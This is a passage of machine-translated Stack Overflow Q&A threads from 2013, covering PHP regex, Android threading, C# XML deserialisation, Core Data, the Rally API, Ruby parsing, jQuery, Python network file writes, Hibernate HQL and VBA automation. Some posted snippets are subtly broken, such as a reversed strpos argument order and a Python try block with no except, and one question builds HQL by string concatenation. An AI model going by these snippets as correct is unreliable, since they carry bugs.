$laptopcontents = Get-ChildItem $laptopfolder -Recurse | where {!$_.PSIsContainer}
$servercontents = Get-ChildItem $serverfolder -Recurse | where {!$_.PSIsContainer}

#Compare on name and length and find changed files on laptop
$diff = Compare-Object $laptopcontents $servercontents -Property name, length -PassThru | where {$_.sideindicator -eq "<="}

#Output differences
$diff | Select-Object FullName 
```

如果您`lastwritetime`在比较对象 cmdlet 中添加长度后，它也会比较修改日期（如果文件已更新但大小仍然相同）。请注意，它只查找不同的日期，而不是新旧日期。:)

# php - 带有特定单词 _my_separator_ 的 PHP 正则表达式

> ID：14220877
> 
> 赞同：0
> 
> 时间：2013-01-08T17:37:52.857
> 
> 标签：php, regex

请我有我想使用正则表达式来 preg_match 这种字符串：

```
$liste = 'bla0bla-__my_separator_-01blabla'; 
```

我试过了 ：

```
if(preg_match('/^[a-zA-Z0-9]_my_separator_[a-zA-Z0-9]$/', $liste))
     echo 'ok';
else echo 'not ok'; 
```

但这返回总是**不行**。

请高手给点意见？

PS：我认为问题在于我尝试过的**_**和**-不支持！**

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:41:32.580

将您的正则表达式模式更改为：

```
'/^[a-zA-Z0-9_\-]+?_my_separator_[a-zA-Z0-9_\-]+?$/' 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-08T17:42:43.137

如果您只是想确定字符串中是否存在**静态**子字符串，您应该使用[`strpos()`](http://php.net/manual/en/function.strpos.php)：

```
if (strpos('_my_separator_', $liste) !== false) {
  echo 'ok';
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-08T17:39:25.830

您在白名单中缺少中继器`+`和`-`和`_`：

`/^[a-zA-Z0-9\-_]+_my_separator_[a-zA-Z0-9\-_]+$/`

您的原始正则表达式将匹配以下内容：

```
A_my_seperator_B
0_my_seperator_C 
```

但不是：

```
AB_my_seperator_C 
```

# android - 在另一个线程中访问 UI 视图*不会*导致崩溃。为什么？

> ID：14220883
> 
> 赞同：2
> 
> 时间：2013-01-08T17:38:14.483
> 
> 标签：android, user-interface, thread-safety, handler

全部：

我真的不了解处理程序。我认为下面的代码——修改为直接访问 UI 小部件（进度条）而不是使用处理程序——会导致跨线程异常。但事实并非如此。所以，我的问题是，这段代码不应该崩溃吗？如果没有，那么我什么时候需要使用处理程序？

```
public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        progress = 0;
        progressBar = (ProgressBar) findViewById(R.id.progressbar);
        progressBar.setMax(200);

        //---do some work in background thread---
        new Thread(new Runnable()
        {
            public void run()
            {
                //ó-do some work hereó-
                while (progressStatus < 200)
                {
                    progressStatus = doSomeWork();
                    progressBar.setProgress(progressStatus); // not on UI thread
                    //ó-Update the progress baró-            // so shouldn't it crash?
//                    handler.post(new Runnable()
//                    {
//                        public void run() {
//                            progressBar.setProgress(progressStatus);
//                        }
//                    });
                }

                //---hides the progress bar---
                handler.post(new Runnable()
                {
                    public void run()
                    {
                        //---0 - VISIBLE; 4 - INVISIBLE; 8 - GONE---
                        progressBar.setVisibility(View.GONE);
                    }
                });
            } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-08T17:41:47.347

如今，`ProgressBar`具有允许`setProgress()`在后台线程上调用的逻辑。它会检查您所在的线程，并在需要时自行`post()`处理。`Runnable`您可以在[源代码](https://android.googlesource.com/platform/frameworks/base/+/refs/heads/master/core/java/android/widget/ProgressBar.java)中看到这一点。

# c# - 在客户端反序列化 mvc web api c# xml

> ID：14220885
> 
> 赞同：0
> 
> 时间：2013-01-08T17:38:19.040
> 
> 标签：c#, asp.net, serialization, asp.net-web-api

我有一个返回 List 的 MVC web api 返回给客户端的 XML 是这样的：

```
<ArrayOfLeadChange xmlns="The-namespace">
<LeadChange>
...
<LeadChange>
<ArrayOfLeadChange> 
```

我已将 LeadChange 类复制到客户端并尝试将 xml 反序列化为 List，但我得到一个异常，即 xml 中存在错误“意外”

有没有一种获取或反序列化的好方法，以便我可以在客户端使用对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-09T03:19:50.213

添加对`System.Net.Http.Formatting`- 这是 Web API 的一部分的引用，但如果您没有在客户端上安装 Web API 程序集，您可以从 Nuget 获取客户端位 - [http://nuget.org/packages/Microsoft.AspNet.WebApi .Client/4.0.20710.0](http://nuget.org/packages/Microsoft.AspNet.WebApi.Client/4.0.20710.0)

```
PM> Install-Package Microsoft.AspNet.WebApi.Client -Version 4.0.20710.0 
```

然后您可以从 Web API 获取并使用反序列化`ReadAsAsync<T>`- [http://msdn.microsoft.com/en-us/library/hh944541(v=vs.108).aspx](http://msdn.microsoft.com/en-us/library/hh944541(v=vs.108).aspx)

例如：

```
var myobjects = Request.Content.ReadAsAsync<List<LeadChange>>().Result; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:42:29.477

我不确定手动反序列化是否是您的用例的正确路径。但是，如果你想要一个好的全能 XML 反序列化器，试试这个。

编辑：这是返回集合的正确函数。

```
 /// <summary>
    /// Converts an XDoc into a List<T> of entities
    /// </summary>
    /// <typeparam name="T">Any serializable object</typeparam>
    /// <param name="doc"></param>
    /// <returns></returns>
    public static List<T> DeserializeCollection<T>(XDocument doc)
    {
        if (doc == null)
            return null;

        try
        {
            XmlSerializer serializer = new XmlSerializer(typeof(List<T>));
            XmlReader reader = doc.CreateReader();
            List<T> result = (List<T>)serializer.Deserialize(reader);
            reader.Close();
            return result;
        }
        catch (Exception e)
        {
            Logging.Log(Severity.Error, "Unable to deserialize document.", e);
            return null;
        }

    } 
```

我不确定为什么你在`<ArrayOf`节点中有一个命名空间。尝试删除它。那应该行得通。您还可以将您的列表输入此函数，以查看“正确”/“预期”的 XML 应该是什么。

```
 /// <summary>
    /// Converts a List<T> of entities into an XDoc.
    /// </summary>
    /// <typeparam name="T">Any serializable object</typeparam>
    /// <param name="doc"></param>
    /// <param name="paramList"></param>
    public static XDocument SerializeCollection<T>(List<T> paramList)
    {
        if (paramList == null)
            return null;

        XDocument doc = new XDocument();

        try
        {
            XmlSerializer serializer = new XmlSerializer(paramList.GetType());
            XmlWriter writer = doc.CreateWriter();
            serializer.Serialize(writer, paramList);
            writer.Close();
            return doc;
        }
        catch (Exception e)
        {
            Logging.Log(Severity.Error, "Unable to serialize list", e);
            return null;
        }

    }
} 
```

# ios - 创建具有相同属性重复条目的核心数据对象？

> ID：14220887
> 
> 赞同：0
> 
> 时间：2013-01-08T17:38:38.153
> 
> 标签：ios, core-data, nsmanagedobject

我想知道这是如何工作的，如果我创建了一个 Car 对象，并且有一个名为 toParts 的关系（它包含这辆车的所有汽车零件），然后我创建了另一辆车，它会复制 toParts 集吗？

添加到核心数据：汽车 a = (toParts = 车轮、轮胎、座椅)

添加到核心数据：汽车 b =（toParts = 车轮、轮胎、座椅）

CarParts.h（具有名称属性）

我现在会有 Carparts = wheel , wheel, Tire, Tyre, seat, seat 如果是这样我需要复制吗？有没有办法将所有未来的汽车指向同一个车轮实例（而不是拥有 1000 个）？

提前致谢

编辑添加代码：

这是我现在用来获取结果的代码，我正在寻找重复项的 ris 并获得最终的汽车数组而不是 carParts（但我想通过 carPart 搜索）

```
-(NSArray*) loadCarsFromCoreDataUsingCarParts:(NSMutableArray*)inputCarParts{
    NSLog(@"carParts =%@",inputCarParts);
    NSFetchRequest *fetchRequest =[[NSFetchRequest alloc]init];
    //To find the Cars we are using the carParts
    NSEntityDescription *entity = [NSEntityDescription entityForName:@"CarPart" inManagedObjectContext:[self managedObjectContext]];

    //sets up fetch request details
    [fetchRequest setEntity:entity];
    //3 here signifies it is an ingredient search
    [fetchRequest setPredicate:[self parseSearchObjectsIntoAPredicate:inputCarParts:3]];
    //don’t understand these results so comment out
    //[fetchRequest setReturnsDistinctResults:YES];
    //[fetchRequest setResultType:NSDictionaryResultType];
    //attempt to preload the nsset containing the cars (just one each time for some reason
[fetchRequest setRelationshipKeyPathsForPrefetching:[NSArray arrayWithObjects:@"ToCar", nil]];

    //Perform fetch
    NSError *error;
    NSArray *records = [[self managedObjectContext] executeFetchRequest:fetchRequest error:&error];

//I have to do this to get the results finally as cars NOT individual instances of car parts
    return [self convertToCars:records];
}

-(NSArray*)convertToCars:(NSArray*)records{
    NSMutableArray *manipulator =[NSMutableArray arrayWithArray:records];
    NSMutableArray *convertedArray =[[NSMutableArray alloc]init];

    for (int i=0; i<[manipulator count]; i++) {
        //regular way
        CarPart *partFromManipulator=(CarPart *)[manipulator objectAtIndex:i];
        [convertedArray addObjectsFromArray:[[ partFromManipulator toCar]allObjects]];
    }

    NSLog(@"Results from core data = %i",[convertedArray count]);
    return [NSArray arrayWithArray:convertedArray];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:11:16.637

Core Data 不关心你是否创建了重复的条目。不会自动检测具有相同属性值的两个对象——因为您可能想要这些。如果您创建两个相同`wheel`的条目，您将获得其中两个。

你*需要*它们吗？只有你能回答这个问题。这取决于您的应用程序的工作方式。有没有`wheel`可能修改这两个对象以使它们没有区别的情况？让多个汽车对象引用同一个车轮是否有意义？答案取决于您的应用程序做什么以及它如何使用这些数据。我不知道你的应用程序是如何工作的，但我的直觉是，如果`wheel`实际上是指一种车轮类型——例如“Bridgestone Blizzak DM-V1 - 245/60R18 105R BSW”，那么允许不止一辆汽车是有意义的用它。如果它指的是车轮的*特定*实例——“这辆特定汽车的右后轮胎”，那么它就没有意义了。但只有你可以肯定地说。

如果您不需要它们，那么当然，您可以安排多辆汽车​​指向同一个车轮。将车轮与汽车的关系设为一对多的关系，然后将一个车轮关联到任意数量的汽车。这并不意味着 Core Data 将开始自动检测重复的车轮——它永远不会那样做。但这确实意味着，如果您保留相同的车轮对象，您可以将它用于不止一辆汽车。

# python - 在 Python 中使用 Rally REST API 复制缺陷的首选方法

> ID：14220890
> 
> 赞同：1
> 
> 时间：2013-01-08T17:38:45.050
> 
> 标签：python, rally, pyral

我希望能够在 Rally 中查询现有缺陷，然后复制该缺陷，仅更改几个字段，同时保留所有附件。有没有一种简单的方法可以做到这一点？我尝试调用 rally.create 并传递现有的缺陷对象，但它未能将所有成员序列化为 JSON。最终，如果将 pyral 扩展为包含这种功能，那就太好了。

相反，我编写了一些代码来复制现有缺陷的每个 python-native 属性，然后将 .ref 用于其他所有内容。它似乎工作得很好。我已经利用 Mark W 的代码来复制附件，而且效果也很好。剩下的一个挫折是复制迭代不起作用。当我在 Iteration 属性上调用 .ref 时，我得到了这个：

```
>>> s
<pyral.entity.Defect object at 0x029A74F0>
>>> s.Iteration
<pyral.entity.Iteration object at 0x029A7710>
>>> s.Iteration.ref
No classFor item for |UserIterationCapacity|
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "c:\python27\lib\site-packages\pyral\entity.py", line 119, in __getattr__
    hydrateAnInstance(self._context, item, existingInstance=self)
  File "c:\python27\lib\site-packages\pyral\restapi.py", line 77, in hydrateAnInstance
    return hydrator.hydrateInstance(item, existingInstance=existingInstance)
  File "c:\python27\lib\site-packages\pyral\hydrate.py", line 62, in hydrateInstance
    self._setAppropriateAttrValueForType(instance, attrName, attrValue, 1)
  File "c:\python27\lib\site-packages\pyral\hydrate.py", line 128, in _setAppropriateAttrValueForType
    elements = [self._unravel(element) for element in attrValue]
  File "c:\python27\lib\site-packages\pyral\hydrate.py", line 162, in _unravel
    return self._basicInstance(thing)
  File "c:\python27\lib\site-packages\pyral\hydrate.py", line 110, in _basicInstance
    raise KeyError(itemType)
KeyError: u'UserIterationCapacity'
>>> 
```

这看起来像是 Rally 的问题，还是我们的项目管理员可能导致的自定义字段的问题？我能够通过从 oid 构建 ref 来解决它：

```
newArtifact["Iteration"] = { "_ref": "iteration/" + currentArtifact.Iteration.oid } 
```

不过，这对我来说感觉很笨拙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T18:04:46.293

查看这个问题的 Python 答案（有 2 个答案，另一个是 Ruby）：

[Rally API：如何复制测试文件夹和成员测试用例](https://stackoverflow.com/questions/13223568/rally-apis-how-to-copy-test-folder-and-member-test-cases)

答案包含一个 python 脚本，它复制测试用例和附件。虽然脚本是针对测试用例的，但逻辑应该很容易适应缺陷，因为操作基本相同——只有字段属性不同。脚本复制了附件、标签等，几乎是整个工件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T18:20:11.970

最终解决方案，包括 Mark W 复制附件的代码

```
def getDataCopy( data ):

    """ Given a piece of data, figure out how to copy it.  If it's a native python type
        like a string or numeric, just return the value.  If it's a rally object, return
        the ref to it.  If it's a list, iterate and call ourself recursively for the
        list members. """

    if isinstance( data, types.ListType ):
        copyData = []
        for entry in data:
            copyData.append( getDataCopy(entry) )

    elif hasattr( data, "ref" ):
        copyData = { "_ref": data.ref }

    else:
        copyData = data

    return copyData

def getArtifactCopy( artifact ):

    """ Build a dictionary based on the values in the specified artifact.  This dictionary
        can then be passed to a rallyConn.put() call to actually create the new entry in
        Rally.  Attachments and Tasks must be copied seperately, since they require creation
        of additional artifacts """

    newArtifact = {}

    for attrName in artifact.attributes():

        # Skip the attributes that we can't or shouldn't handle directly
        if attrName.startswith("_") or attrName == "oid" or attrName == "Iteration" or attrName == "Attachments":
            continue

        attrValue = getattr( artifact, attrName )
        newArtifact[attrName] = getDataCopy( attrValue )

    if getattr( artifact, "Iteration", None ) != None:
        newArtifact["Iteration"] = { "_ref": "iteration/" + artifact.Iteration.oid }

    return newArtifact

def copyAttachments( rallyConn, oldArtifact, newArtifact ):

    """ For each attachment in the old artifact, create new attachments and attach them to the new artifact"""

    # Copy Attachments
    source_attachments = rallyConn.getAttachments(oldArtifact)

    for source_attachment in source_attachments:

        # First copy the content
        source_attachment_content = source_attachment.Content
        target_attachment_content_fields = { "Content": base64.encodestring(source_attachment_content) }

        try:
            target_attachment_content = rallyConn.put( 'AttachmentContent', target_attachment_content_fields )
            print "\t===> Copied AttachmentContent: %s" % target_attachment_content.ref
        except pyral.RallyRESTAPIError, details:
            sys.stderr.write('ERROR: %s \n' % details)
            sys.exit(2)

        # Next copy the attachment object
        target_attachment_fields = {
            "Name": source_attachment.Name,
            "Description": source_attachment.Description,
            "Content": target_attachment_content.ref,
            "ContentType": source_attachment.ContentType,
            "Size": source_attachment.Size,
            "User": source_attachment.User.ref
        }

        # Attach it to the new artifact
        target_attachment_fields["Artifact"] = newArtifact.ref

        try:
            target_attachment = rallyConn.put( source_attachment._type, target_attachment_fields)
            print "\t===> Copied Attachment: '%s'" % target_attachment.Name
        except pyral.RallyRESTAPIError, details:
            sys.stderr.write('ERROR: %s \n' % details)
            sys.exit(2)

def copyTasks( rallyConn, oldArtifact, newArtifact ):

    """ Iterate over the old artifacts tasks and create new ones, attaching them to the new artifact """

    for currentTask in oldArtifact.Tasks:

        newTask = getArtifactCopy( currentTask )

        # Assign the new task to the new artifact
        newTask["WorkProduct"] = newArtifact.ref

        # Push the new task into rally
        newTaskObj = rallyConn.put( currentTask._type, newTask )

        # Copy any attachments the task had
        copyAttachments( rallyConn, currentTask, newTaskObj )

def copyDefect( rallyConn, currentDefect, addlUpdates = {} ):

    """ Copy a defect including its attachments and tasks.  Add the new defect as a
        duplicate to the original """

    newArtifact = getArtifactCopy( currentDefect )

    # Add the current defect as a duplicate for the new one
    newArtifact["Duplicates"].append( { "_ref": currentDefect.ref } )

    # Copy in any updates that might be needed
    for (attrName, attrValue) in addlUpdates.items():
        newArtifact[attrName] = attrValue

    print "Copying %s: %s..." % (currentDefect.Project.Name, currentDefect.FormattedID),
    newDefect = rallyConn.create( currentDefect._type, newArtifact )

    print "done, new item", newDefect.FormattedID

    print "\tCopying attachments"
    copyAttachments( rallyConn, currentDefect, newDefect )

    print "\tCopying tasks"
    copyTasks( rallyConn, currentDefect, newDefect ) 
```

# ruby-on-rails - 如何使用 httparty for rails 3 解析 og 元标记

> ID：14220891
> 
> 赞同：1
> 
> 时间：2013-01-08T17:38:45.033
> 
> 标签：ruby-on-rails, ruby, facebook-opengraph, httparty

我正在尝试使用以下代码使用 HTTParty gem 解析 og 元标记：

```
link = http://www.usatoday.com/story/gameon/2013/01/08/nfl-jets-tony-sparano-fired/1817037/
# link = http://news.yahoo.com/chicago-lottery-winners-death-ruled-homicide-181627271.html
resp = HTTParty.get(link)
ret_body = resp.body

# title
  og_title = ret_body.match(/\<[Mm][Ee][Tt][Aa] property\=\"og:title\"\ content\=\"(.*?)\"\/\>/)
  og_title = og_title[1].to_s 
```

问题是它在某些网站上有效（雅虎！）但在其他网站上无效（今天的美国）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:58:33.750

不要用正则表达式解析 HTML，因为除了最简单的问题之外，它们对于任何事情都太脆弱了。对 HTML 的微小更改可能会破坏模式，导致您开始一场缓慢的战斗，以维护不断扩展的模式。这是一场你不会赢的战争。

相反，请使用 HTML 解析器。Ruby 有[Nokogiri](http://nokogiri.org)，非常棒。以下是我将如何做你想做的事：

```
require 'nokogiri'
require 'httparty'

%w[
  http://www.usatoday.com/story/gameon/2013/01/08/nfl-jets-tony-sparano-fired/1817037/
  http://news.yahoo.com/chicago-lottery-winners-death-ruled-homicide-181627271.html
].each do |link|
  resp = HTTParty.get(link)

  doc = Nokogiri::HTML(resp.body)
  puts doc.at('meta[property="og:title"]')['content']
end 
```

哪个输出：

```
喷气机队解雇进攻协调员托尼·斯帕拉诺
芝加哥彩票中奖者的死亡裁定为凶杀案

```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-16T12:09:49.220

也许我可以提供一个更简单的解决方案？查看[OpenGraph](https://github.com/intridea/opengraph) gem。

这是一个简单的库，用于解析来自网站的 Open Graph 协议信息，应该可以解决您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:38:45.033

解决方案：

```
og_title = ret_body.match(/\<[Mm][Ee][Tt][Aa] property\=\"og:title\"\ content\=\"(.*?)\"[\s\/\>|\/\>]/)
og_title = og_title[1].to_s 
```

尾随空格弄乱了解析，所以一定要检查一下。我在正则表达式中添加了一个 OR 子句，以允许尾随和非尾随空格。

# wpf - 在 WPF ItemsControl 中绕过栅栏原则

> ID：14220897
> 
> 赞同：1
> 
> 时间：2013-01-08T17:38:53.787
> 
> 标签：wpf, itemscontrol, fencepost

我有一个 ItemsControl，`DataTemplate`其中包含一个`Margin`值，`0,0,0,20`用于在每个项目之间添加 20 像素的间隙。问题是，当此控件滚动时，由于此边距应用于最终项目，最终项目后有 20px 的空闲。

我如何在最后删除/剪掉这个间隙，或者确保它不是首先添加的？即，在项目*之间*应用 20px 的间隙，但*不在*列表的开头或结尾？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:51:59.923

在 上`ItemsPanelTemplate`，将`Margin`属性设置为“0,0,0,-20”。

例子：

```
<Grid Background="Black">
    <ItemsControl ItemsSource="abcdefg" Background="White" VerticalAlignment="Top">
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <Border Margin="0,0,0,20" Background="Silver">
                    <TextBlock Text="{Binding}" Margin="5" />
                </Border>
            </DataTemplate>
        </ItemsControl.ItemTemplate>
        <ItemsControl.ItemsPanel>
            <ItemsPanelTemplate>
                <StackPanel Margin="0,0,0,-20" />
            </ItemsPanelTemplate>
        </ItemsControl.ItemsPanel>
    </ItemsControl>
</Grid> 
```

# javascript - 创建包含 jquery 的 js 文件时出错

> ID：14220906
> 
> 赞同：0
> 
> 时间：2013-01-08T17:39:25.690
> 
> 标签：javascript, jquery, ruby-on-rails

我创建了一个文件叫做：jquery.js：

```
$(document).ready(function{
   jQuery('#sortable1, #sortable2')
     .sortable(
     {'connectWith':'.connectedSortable',
     'dropOnEmpty':true,
     'scroll':true,
      items: "li:not(.emptyMessage)",
      receive: function(event, ui) {
             //hide empty message on receiver
             $('li.emptyMessage', this).hide();

             //show empty message on sender if applicable
             if($('li:not(.emptyMessage)', ui.sender).length == 0){
                 $('li.emptyMessage', ui.sender).show();
             } else {
                 $('li.emptyMessage', ui.sender).hide();
             }            
         }

    });
}); 
```

在我的`index.html.erb`，我有：

**我添加了第一个脚本 SRC ...：**

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js" type="text/javascript"></script>
<script src="assets/jquery.js" type="text/javascript"></script>
<ul id="sortable1" class="connectedSortable">
   <li>List 1-1</li>
   <li>List 1-2</li>
   <li>List 1-3</li>
   <li>List 1-4</li>
   <li class="emptyMessage">This is empty</li>
</ul>

<ul id="sortable2" class="connectedSortable">
  <li>List 2-1</li>
  <li>List 2-2</li>
  <li>List 2-3</li>
  <li>List 2-4</li>
  <li class="emptyMessage">This is empty</li>
</ul>
<div class="clear"></div> 
```

在中`console`，我得到了下一个错误：

```
Uncaught SyntaxError: Unexpected token { :3000/assets/jquery.js?body=1:1
Uncaught ReferenceError: jQuery is not defined jquery_ujs.js:429
Uncaught ReferenceError: jQuery is not defined jquery.purr.js:162
Uncaught ReferenceError: jQuery is not defined best_in_place.js:561
Uncaught ReferenceError: jQuery is not defined workers.js:3
Uncaught ReferenceError: $ is not defined application.js:19
Uncaught SyntaxError: Unexpected token { 
```

我认为所有的错误都是因为 jquery.js。

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:44:52.663

我认为你必须先声明它`doc ready`

如果您在此脚本之前没有`jQuery plugin`附加，那么这些修改将不起作用，因此请尝试先包含`jQuery`此脚本：

`And if you use cdn hosted script then page load performance will boostup.`

需要注意的一点点修改：

```
$(document).ready(function{
   //--------------------^----missing braces '()' 
```

它应该是：

```
$(document).ready(function(){ 
```

如果这不能解决，请尝试在此行上方声明

```
jQuery = $.noConflict();
jQuery(document).ready(function($){ 
```

你需要这个订单：

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js" type="text/javascript"></script>

<script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js" type="text/javascript"></script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:44:09.037

您还应该加载完整的 jquery 文件，例如：

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script> 
```

并且将前两行更改为以下内容也更好一些：

```
jQuery(document).ready(function ($) {
    $('#sortable1, #sortable2') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T17:44:17.557

在包含您的 .js 文件之前，在您的 HTML 中包含 jquery

```
<script src="../../Scripts/jquery-1.8.3.js" type="text/javascript"></script> 
```

然后..

```
<script src="../../Scripts/jQuery.js" type="text/javascript"></script> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-08T17:45:07.410

您需要在页面中实际加载 JQuery 库，然后才能使用它定义的任何内容。如果不加载它，您尝试调用的任何内容都没有在任何地方定义，因此没有什么可调用的。

例如，将以下内容放在任何其他脚本标签之前：

`<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js" type="text/javascript"></script>`

Jai 关于您的语法错误的回答在这方面也是正确的：

`Uncaught SyntaxError: Unexpected token { :3000/assets/jquery.js?body=1:1`

是由于您在匿名函数声明中的 function 关键字后面没有括号。

声明不带参数的匿名函数的正确方法是：

```
 function () {
  //anonymous function routines/etc in here
} 
```

所以你的第一行需要看起来像：

```
 $(document).ready(function () { 
```

# android - 下载图像并将它们放入 ImageViews

> ID：14220908
> 
> 赞同：0
> 
> 时间：2013-01-08T17:39:34.037
> 
> 标签：android, android-asynctask, android-imageview

嗨，新年快乐！

我正在尝试从互联网上下载图像并将它们放入不同的 ImageViews 中。ImageViews 在用户滚动时动态创建。当用户到达滚动视图的底部时，我又加载了 10 张图像。

图像加载正常，但是当我有很多图像时，我得到一个 java.lang.OutOfMemoryError。

我知道问题是我有很多图像消耗大量内存，所以......我的场景该怎么做？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:59:35.743

尝试使用 ListView 而不是 ScrollView。然后你可以使用像[Universal Image Loader](https://github.com/nostra13/Android-Universal-Image-Loader)这样的延迟加载技术。ListView 利用视图回收，这将更容易在您的内存中，您还可以使用图像加载器缓存图像。这个库也有一些内存管理选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:50:28.223

您将不得不跟踪已加载的图像，并在它们看不见时开始回收它们。

您可能会发现[LruCache](http://developer.android.com/reference/android/util/LruCache.html)是一个有价值的工具。在 IO12 上有一个很好的演讲“ [Doing More With Less: Being a Good Android Citizen](http://www.youtube.com/watch?v=gbQb1PVjfqM) ”，讨论了很多内存问题，并在 4 分钟左右开始讨论如何使用 LruCache。

# python - python网络文件以健壮的方式写入

> ID：14220910
> 
> 赞同：1
> 
> 时间：2013-01-08T17:39:35.533
> 
> 标签：python, file, networking

我正在寻找一种可靠的方式来写入网络驱动器。我坚持使用 WinXP 写入 Win2003 服务器上的共享。如果网络共享出现故障，我想暂停写入……然后在网络资源可用后重新连接并继续写入。在下面我的初始代码中，当驱动器消失时，“except”会捕获 IOError，但是当驱动器再次可用时，outf 操作会继续到 IOError。

```
import serial

with serial.Serial('COM8',9600,timeout=5) as port, open('m:\\file.txt','ab') as outf:
    while True:
        x = port.readline() # read one line from serial port
        if x:   # if the there was some data
            print x[0:-1]     # display the line without extra CR
            try:
                outf.write(x) # write the line to the output file
                outf.flush() # actually write the file
            except IOError: # catch an io error
                print 'there was an io error' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:45:25.987

我怀疑一旦打开的文件由于 IOError 而进入错误状态，您将需要重新打开它。你可以尝试这样的事情：

```
with serial.Serial('COM8',9600,timeout=5) as port:
    while True:
        try:
            with open('m:\\file.txt','ab') as outf:
                while True:
                    x = port.readline() # read one line from serial port
                    if x:   # if the there was some data
                        print x[0:-1]     # display the line without extra CR
                        try:
                            outf.write(x) # write the line to the output file
                            outf.flush() # actually write the file
                break
        except IOError:
            print 'there was an io error' 
```

这会将异常处理放在一个外部循环中，该循环将在发生异常时重新打开文件（并继续从端口读取）。在实践中，您可能希望`time.sleep()`在块中添加 a 或其他内容，`except`以防止代码旋转。

# hibernate - 休眠 HQL 查询

> ID：14220912
> 
> 赞同：0
> 
> 时间：2013-01-08T17:39:51.597
> 
> 标签：hibernate, hql

我正在尝试使用多个 where 参数创建 HQL 查询

```
result = sessionFactory.getCurrentSession().createQuery("from County where " + [0].property + "=?"+","+ c[1].property + "=?") 
```

.setParameter(0, c[0].value)
.setParameter(1, c[1].value).list();

我没有这样做，而是尝试创建一个可以处理任意数量的参数的查询，例如

```
for(Params c:parms){`enter code here`
    queryString+= c.property +" = "+c.value+",";
    }
result = (State) sessionFactory.getCurrentSession()
                .createQuery("from County where " +queryString)
                .list().get(0); 
```

那里的查询看起来正确，但它说“无法执行查询”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:48:13.643

a）你为什么放弃使用准备好的语句，就像你使用固定大小的参数一样？

b) 你为什么要归因`c.property +" = "+c.value+",";`于“结果”而不是 queryString？

c) 逗号对所述属性有何作用？不应该是“和”或“或”吗？

重新评论你的答案

"a) 使用多个 pam 而不是固定大小"

```
String whereClause = new String();
for (Params p : params) {
    if (whereClause.isEmpty())
        whereClause = " where ";
    else
        whereClause += " and ";
    whereClause += p.property + " = ? ";
}
Query query = sessionFactory.getCurrentSession().createQuery("from County " + whereClause);
for (int i = 0; i<params.size(); i++) {
    query.setParameter(i, params[i].value);
}
result = (State) query.list().get(0); 
```

“c）即使我只有一个参数来说明使用上述代码失败的地方！-”

好吧，是的，即使您有一个参数，您仍然在查询末尾添加一个逗号。这不是有效的格式

# windows-7 - VBA Excel 从 Windows 7 中的 IBM Personal Communications (PCOMM) 检索数据的问题

> ID：14220917
> 
> 赞同：0
> 
> 时间：2013-01-08T17:40:15.137
> 
> 标签：windows-7, excel, settext, vba

我正在尝试在 Excel 中编写一个宏，它可以帮助我将输入发送到 PCOMM 并从那里检索数据。当我在 Windows XP 上测试时，我的代码运行良好。但是，当我在 Windows 7 上运行它们时，它不会运行，只是冻结。下面是一个示例：

```
Dim autECLPSObj As Object

Dim autECLConnList As Object

Set autECLPSObj = CreateObject("PCOMM.autECLPS")

Set autECLConnList = CreateObject("PCOMM.autECLConnList")

' Initialize the connection

autECLConnList.Refresh

autECLPSObj.SetConnectionByHandle (autECLConnList(1).Handle)

autECLPSObj.SetText "test", 24, 11 
```

所以基本上当我尝试在 Windows 7 上调试（并使用 F8 移动每一行）时，它会传递到“SetText”行，然后它就冻结了——Excel 一直显示它的“正在运行”，而没有任何内容输入 PCOMM。

更新：尝试使用不同的 Windows 和 PComm 版本运行。以下是摘要： * Win XP + PComm 5.7/5.9/6.0：代码有效 * Win 7 + PComm 5.7/5.9：代码有效 * Win 7 + PComm 6.0：代码无效

有任何想法吗？

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T15:52:17.987

通常我使用 SendKeys 在 PCOMM 中输入一些东西。

autECLPSObj.SendKeys "xxx", 24, 11

# css - 如何减少 Twitter Bootstrap 中两行/容器之间的边距？

> ID：14220927
> 
> 赞同：1
> 
> 时间：2013-01-08T17:41:01.710
> 
> 标签：css, twitter-bootstrap

我在两个容器中有两行，但我不知道如何减少底部和顶部边距/填充以使内容更接近。

太远了，`bottom content`我想让它更靠近第一行/容器。我尝试将填充和边距应用于行和容器，但没有成功。

这是下面的html的[小提琴](http://jsfiddle.net/6pbPd/)。

```
<html lang="en">
<head>
    <title></title>
    <link href="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/css/bootstrap-combined.min.css" rel="stylesheet" />
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.3.min.js"></script>
